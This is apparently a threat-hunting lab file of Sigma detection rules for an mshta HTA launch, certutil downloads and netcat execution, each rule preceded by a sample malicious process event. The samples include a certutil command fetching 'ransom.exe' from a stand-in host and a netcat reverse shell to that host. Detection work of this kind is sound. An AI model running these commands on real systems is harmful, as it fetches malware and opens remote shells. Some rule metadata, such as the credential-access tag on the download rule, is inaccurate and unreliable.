# Sigma hunt examples
1. HTA Payload: <!--StartFragment-->

Parent Image: chrome.exe

Image: mshta.exe

Command Line: C:\Windows\SysWOW64\mshta.exe C:\Users\victim\Downloads\update.hta

<!--EndFragment-->

```
title: #Title of your rule
id: b98d0db6-511d-45de-ad02-e82a98729620#Universally Unique Identifier (UUID) Generate one from https://www.uuidgenerator.net
status: testing #stage of your rule testing 
description: testing #Details about the detection intensions of the rule.
author: nishan #Who wrote the rule.
date: today #When was the rule written.
logsource:
  product: windows
  service: sysmon
detection:
    selection:
        EventID: '4688'
    selection_img:
        - Image|endswith: '\mshta.exe'
        - OriginalFileName: 'MSHTA.EXE'
    selection_parent:
        ParentImage|endswith:
            - 'chrome.exe'
    condition: all of selection_*
falsepositives:
    - Unknown
level: high

```

2. Certutil dwnload:
<!--StartFragment-->

Image: certutil.exe

Command Line: certutil -urlcache -split -f http://huntmeplz.com/ransom.exe ransom.exe

<!--EndFragment-->
```
title: test #Title of your rule
id: test #Universally Unique Identifier (UUID) Generate one from https://www.uuidgenerator.net
status: test #stage of your rule testing 
description: test #Details about the detection intensions of the rule.
author: #Who wrote the rule.
date: #When was the rule written.
modified: #When was it updated
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: '4688'
  selection_img:
    - Image|endswith: '\certutil.exe' #Search identifiers for the detection. Refer to the required fields provided in the task. 
  selection_cli:
    CommandLine|contains:
      - "-urlcache"
      - "-split"
      - '-f'
  condition: all of selection_* #Action to be taken. Can use condition operators such as OR, AND, NOT, 
fields: #List of associated fields that are important for the detection

falsepositives: #Any possible false positives that could trigger the rule.

level: medium #Severity level of the detection rule.
tags: #Associated TTPs from MITRE ATT&CK
  - attack.credential_access #MITRE Tactic
  - attack.t1110 #MITRE Technique
	
```
3. Netcat reverse shell:
<!--StartFragment-->

Image: nc.exe

Command Line: C:\Users\victim\AppData\Local\Temp\nc.exe huntmeplz.com 4444 -e cmd.exe

[MD5]() Hash: 523613A7B9DFA398CBD5EBD2DD0F4F38

<!--EndFragment-->
```
<!--StartFragment-->

title: sighunt\
id: 232c5562-f775-4ad4-a162-816c99b013a6\
status: rule testing\
description: Netcat Execution\
author: lordofficial\
date: 06/02/2023\
modified: 06/02/23\
logsource:\
product: windows\
service: process\_creation\
detection:\
selection1:\
EventID: 1\
\
Image|endswith: '\nc.exe'\
CommandLine|contains|all:\
\- ' -e '\
selection2:\
Hashes|contains: '523613A7B9DFA398CBD5EBD2DD0F4F38'\
\
condition: selection1 or selection2

<!--EndFragment-->

```
